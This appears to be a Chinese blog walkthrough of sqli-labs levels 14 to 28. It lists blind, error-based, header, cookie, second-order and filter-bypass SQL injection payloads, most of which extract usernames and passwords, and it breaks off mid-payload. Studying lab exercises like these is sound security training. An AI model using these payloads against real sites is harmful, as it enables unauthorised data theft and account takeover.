<h3 id="14关：”-闭合-报错注入，同13关"><a href="#14关：”-闭合-报错注入，同13关" class="headerlink" title="14关：” 闭合 报错注入，同13关"></a><strong>14关：” 闭合 报错注入，同13关</strong></h3><h3 id="15关：’-闭合-布尔盲注，延时注入"><a href="#15关：’-闭合-布尔盲注，延时注入" class="headerlink" title="**15关：’ 闭合 布尔盲注，延时注入 **"></a>**15关：’ 闭合 布尔盲注，延时注入 **</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line">uname=&#x27; or (ascii(substr((select database()) ,1,1))) = 115 #&amp;passwd=&#x27; or 1=1 #&amp;submit=Submit //猜当前数据库的第一个字符为 S</span><br><span class="line"></span><br><span class="line">时间盲注：</span><br><span class="line">uname=1&#x27; and 1=2 union select 1,(length(database()儿)= 8 and if(1=1, sleep(5), 1)#&amp;passwd=1&amp;submit=Submit  //猜当前数据库的第一个字符为 S</span><br></pre></td></tr></table></figure>



<h3 id="16关：”-闭合-布尔盲注，延时注入-同15关"><a href="#16关：”-闭合-布尔盲注，延时注入-同15关" class="headerlink" title="16关：” 闭合 布尔盲注，延时注入 同15关"></a><strong>16关：” 闭合 布尔盲注，延时注入 同15关</strong></h3><h3 id="17关：’-闭合-报错注入-同13关"><a href="#17关：’-闭合-报错注入-同13关" class="headerlink" title="17关：’ 闭合 报错注入 同13关"></a><strong>17关：’ 闭合 报错注入 同13关</strong></h3><h3 id="18关：HTTP-头部注入-User-Agent"><a href="#18关：HTTP-头部注入-User-Agent" class="headerlink" title="18关：HTTP 头部注入  User-Agent"></a><strong>18关：HTTP 头部注入  User-Agent</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">代码审计，找到 <span class="keyword">insert</span>（插入数据的意思）</span><br><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;,&#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line"></span><br><span class="line">在<span class="keyword">User</span><span class="operator">-</span>Agent: 处注入</span><br><span class="line">猜想在数据中的<span class="keyword">sql</span>语句为：<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">values</span>(<span class="string">&#x27;User-Agent&#x27;</span>,<span class="string">&#x27;Ip&#x27;</span>,<span class="string">&#x27;Username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">接下来我们尝试在<span class="keyword">User</span><span class="operator">-</span>Agent的位置进行注入测试，我们修改<span class="keyword">User</span><span class="operator">-</span>Agnet的值使其符合整个 <span class="keyword">insert</span> <span class="keyword">into</span> 的语法，闭合后就应该为 <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span> ,<span class="number">1</span>,<span class="number">1</span>)#<span class="string">&#x27;,&#x27;</span>Ip<span class="string">&#x27;,&#x27;</span>Username<span class="string">&#x27;),成功绕过</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">18：源码片段$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>$uagent<span class="string">&#x27;, &#x27;</span>$IP<span class="string">&#x27;, $uname)&quot;;//这里是三个值</span></span><br><span class="line"><span class="string">改为：User-Agent: &#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">0</span>) <span class="keyword">or</span> <span class="operator">/</span><span class="operator">/</span>这里是三个值</span><br><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent 的闭合原理思路还得研究</span><br><span class="line">或者：<span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),0) and&#x27;</span></span><br><span class="line">或者：<span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),0),1,1)#  </span></span><br></pre></td></tr></table></figure>



<h3 id="19关：HTTP-头部注入-Referer"><a href="#19关：HTTP-头部注入-Referer" class="headerlink" title="19关：HTTP 头部注入 Referer"></a><strong>19关：HTTP 头部注入 Referer</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>：源码片段$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;; <span class="operator">/</span><span class="operator">/</span>这里是两个值</span><br><span class="line"><span class="keyword">sql</span>注入显示<span class="keyword">Column</span> count doesn<span class="string">&#x27;t match value count at row 1，那么意味着你的值数目不对应</span></span><br><span class="line"><span class="string">比如insert into 表名 (field1,field2,field3) values(&#x27;</span>a<span class="string">&#x27;,&#x27;</span>b<span class="string">&#x27;)这样前面的是三列，后面却只有二个值，这就会出现这个错误的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Referer: &#x27;</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">0</span>),<span class="number">1</span>)#    <span class="operator">/</span><span class="operator">/</span>这里是两个值</span><br></pre></td></tr></table></figure>



<h3 id="20关：HTTP-头部注入-Cookie-’-闭合-显错"><a href="#20关：HTTP-头部注入-Cookie-’-闭合-显错" class="headerlink" title="20关：HTTP 头部注入 Cookie  ’ 闭合 显错"></a><strong>20关：HTTP 头部注入 Cookie  ’ 闭合 显错</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">正常登录后，admin<span class="string">&#x27; 报错，说名存在SQL注入</span></span><br><span class="line"><span class="string">修改value值，必须把语句放在位置3，否则有些语句会报错(原因未知)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查所以数据库：-n&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name)<span class="keyword">from</span> information_schema.schemata#</span><br><span class="line"></span><br><span class="line">查表：<span class="operator">-</span>n<span class="string">&#x27;union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查字段：-n&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#</span><br><span class="line"></span><br><span class="line">查字段内容：<span class="operator">-</span>n<span class="string">&#x27;union select 1,2,group_concat(id,0x7e,username,0x3A,password,0x7e) from security.users#</span></span><br></pre></td></tr></table></figure>



<h3 id="21关：HTTP-头部注入-‘）-闭合-过base64的Cookie"><a href="#21关：HTTP-头部注入-‘）-闭合-过base64的Cookie" class="headerlink" title="21关：HTTP 头部注入 ‘） 闭合 过base64的Cookie"></a><strong>21关：HTTP 头部注入 ‘） 闭合 过base64的Cookie</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源码片段：$cookee <span class="operator">=</span> base64_decode($cookee); </span><br><span class="line">例如：<span class="operator">-</span>n&quot; union select 1,2,group_concat(schema_name)from information_schema.schemata#</span><br><span class="line">base64后再去执行：</span><br><span class="line">LW4iIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw==</span><br></pre></td></tr></table></figure>



<h3 id="22关：HTTP-头部注入-”-闭合-过base64的Cookie"><a href="#22关：HTTP-头部注入-”-闭合-过base64的Cookie" class="headerlink" title="22关：HTTP 头部注入 ” 闭合 过base64的Cookie"></a><strong>22关：HTTP 头部注入 ” 闭合 过base64的Cookie</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源码$cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">			$cookee1 <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">例如：<span class="operator">-</span>n&quot; union select 1,2,group_concat(schema_name)from information_schema.schemata#</span><br><span class="line">base64后再去执行：</span><br><span class="line">LW4iIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw==</span><br></pre></td></tr></table></figure>



<h3 id="23关：get-请求-过滤了注释符-显错注入"><a href="#23关：get-请求-过滤了注释符-显错注入" class="headerlink" title="23关：get 请求 过滤了注释符  显错注入"></a><strong>23关：get 请求 过滤了注释符  显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">源码片段：</span><br><span class="line">$reg <span class="operator">=</span> &quot;/#/&quot;;</span><br><span class="line">$reg1 <span class="operator">=</span> &quot;/--/&quot;;</span><br><span class="line">$replace <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">将注释符过滤为空不能像以前那样</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3-- -</span></span><br><span class="line"><span class="string">此处的sql语句为</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3-- -&#x27;</span>limit <span class="number">0</span>,<span class="number">1</span>（<span class="comment">-- -后面的语句就会被忽略）</span></span><br><span class="line"></span><br><span class="line">解决办法<span class="number">1</span>：?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),&#x27;</span><span class="number">3</span></span><br><span class="line">此处的<span class="keyword">sql</span>语句为</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;3&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>(这样整个句子就通了，只要通了就能运行)</span><br><span class="line"></span><br><span class="line">解决办法<span class="number">2</span>：?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username),group_concat(password) from users where 1 or &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span></span><br><span class="line">此处的<span class="keyword">sql</span>语句为</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password) <span class="keyword">from</span> users <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">语句通顺就是可以运行的</span><br></pre></td></tr></table></figure>



<h3 id="24关：二次注入"><a href="#24关：二次注入" class="headerlink" title="24关：二次注入"></a><strong>24关：二次注入</strong></h3><p>数据进库是没有执行，在出库时才被执行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>先注册一个admin<span class="string">&#x27; #的账号。</span></span><br><span class="line"><span class="string">2.登录admin&#x27;</span>#，修改该账号的密码，此时修改的就是admin的密码。<span class="keyword">Sql</span>语句变为 UPDATE users <span class="keyword">SET</span> passwd<span class="operator">=</span>&quot;New_Pass&quot; <span class="keyword">WHERE</span> username <span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27;AND password=&#x27;</span></span><br><span class="line">也就是执行了UPDATE users <span class="keyword">SET</span> passwd<span class="operator">=</span><span class="string">&#x27;New_Pass&#x27;</span> <span class="keyword">WHERE</span> username <span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line">成功的话页面会提示Password successfully updated</span><br></pre></td></tr></table></figure>



<h3 id="25关：and-和-or-被过滤-显错注入"><a href="#25关：and-和-or-被过滤-显错注入" class="headerlink" title="25关：and 和 or 被过滤 显错注入"></a><strong>25关：and 和 or 被过滤 显错注入</strong></h3><p>尝试大小写绕过失败</p>
<p>过滤方法：双写 </p>
<p>还可以用对应符号代替 or = || ，and = &amp;&amp;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; oorrder by 4-- - //查列数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> infoorrmation_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- - //查数据库</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; aandnd table_name=&#x27;</span>users<span class="string">&#x27;-- - //查字段数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,<span class="number">0x7e</span>,username,<span class="number">0x3A</span>,passwoorrd,<span class="number">0x7e</span>) <span class="keyword">from</span> security.users<span class="comment">-- - //字段内容</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="25a关：和25方法一样，只是这是数字型-显错注入"><a href="#25a关：和25方法一样，只是这是数字型-显错注入" class="headerlink" title="25a关：和25方法一样，只是这是数字型 显错注入"></a><strong>25a关：和25方法一样，只是这是数字型 显错注入</strong></h3><p>就是不用闭合</p>
<h3 id="26关：过滤了-or，and-，-–-空格-报错注入，显错注入"><a href="#26关：过滤了-or，and-，-–-空格-报错注入，显错注入" class="headerlink" title="26关：过滤了 or，and ， / , – , # , 空格 , /   报错注入，显错注入*"></a><em><em>26关：过滤了 or，and ， /</em> , – , # , 空格 , /   报错注入，显错注入</em>*</h3><p>空格：</p>
<p>使用 %0A 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”</p>
<p>闭合：</p>
<p>在语句尾部构造 ‘  或 %00注释</p>
<p>使用报错注入，函数内不需要考虑空格</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  <span class="operator">/</span><span class="operator">/</span>查数据库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1, concat(0x7e, (SELECT (group_concat(table_name)) FROM (infoorrmation_schema.tables) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(1,(SELECT (group_concat(column_name)) FROM (infoorrmation_schema.columns) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27; %26%26 table_name = &#x27;</span>users<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据 调整id<span class="operator">=</span>n</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="26a关：闭合多一个括号-‘-报错注入，显错注入"><a href="#26a关：闭合多一个括号-‘-报错注入，显错注入" class="headerlink" title="26a关：闭合多一个括号 ‘) 报错注入，显错注入"></a><strong>26a关：闭合多一个括号 ‘) 报错注入，显错注入</strong></h3><p>payload 可以和26一样(报错)，也可以和27a一样(显错)</p>
<h3 id="27关：过滤-关键字-union-和-select-报错注入"><a href="#27关：过滤-关键字-union-和-select-报错注入" class="headerlink" title="27关：过滤 关键字 union 和 select 报错注入"></a><strong>27关：过滤 关键字 union 和 select 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">过滤</span><br><span class="line"><span class="keyword">function</span> blacklist($id)&#123;</span><br><span class="line">    $id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);     <span class="operator">/</span><span class="operator">/</span>过滤 <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);       //过滤 --.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);        //过滤 #.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);       //过滤 spaces.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //过滤 spaces.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);       //过滤 spaces.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;, $id);     //过滤 union</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;, $id);    //过滤 select</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;, $id);     //过滤 UNION</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;, $id);    //过滤 SELECT</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;, $id);     //过滤 Union</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;, $id);    //过滤 select</span></span><br><span class="line"><span class="comment">    return $id;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p>使用<strong>大小写</strong>或者<strong>双写</strong>绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">同样使用 updataxml 报错注入，函数内避开空格过滤</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查当前数据库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1, concat(0x7e, (SElect (group_concat(table_name)) FROM (information_schema.tables) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(1,(SElect(group_concat(column_name)) FROM (information_schema.columns) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27; %26%26 table_name = &#x27;</span>users<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x0a,(SElect(group_concat(concat_ws(0x3a,username,password))) FROM (security.users) WHERE (id = 4) )),1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据 调整id<span class="operator">=</span>n</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="27a关：只是闭合方式不一样-显错注入"><a href="#27a关：只是闭合方式不一样-显错注入" class="headerlink" title="27a关：只是闭合方式不一样 显错注入"></a><strong>27a关：只是闭合方式不一样 显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,2,3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查显示位</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(schema_name)%0Afrom%0Ainformation_schema.schemata),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span><span class="operator">/</span><span class="operator">/</span>全库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;security&#x27;),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=&#x27;security&#x27;%0Aand%0Atable_name=&#x27;users&#x27;),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(&#x27;~&#x27;,id,&#x27;.&#x27;,username,&#x27;.&#x27;,password,&#x27;.&#x27;)%0Afrom%0Asecurity.users),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据</span><br></pre></td></tr></table></figure>

<h3 id="28关：过滤-union-select-组合-显错注入"><a href="#28关：过滤-union-select-组合-显错注入" class="headerlink" title="28关：过滤 union select 组合 显错注入"></a><strong>28关：过滤 union select 组合 显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);              <span class="operator">/</span><span class="operator">/</span>过滤 <span class="comment">/*</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);                //过滤 --.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);                 //过滤 #.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);                //过滤 spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);           //过滤 spaces.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);                //过滤 spaces.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/union\s+select/i&#x27;,&quot;&quot;, $id);     //过滤 UNION &amp; SELECT.</span></span><br><span class="line"><span class="comment">return $id;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p>双写绕过union select：un<strong>union select</strong>ion select</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,database(),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查询当前数据库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(schema_name)%0Afrom%0Ainformation_schema.schemata),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>全库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;</span>security<span class="string">&#x27;),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=&#x27;</span>security<span class="string">&#x27;%0Aand%0Atable_name=&#x27;</span>users<span class="string">&#x27;),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span> 查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span 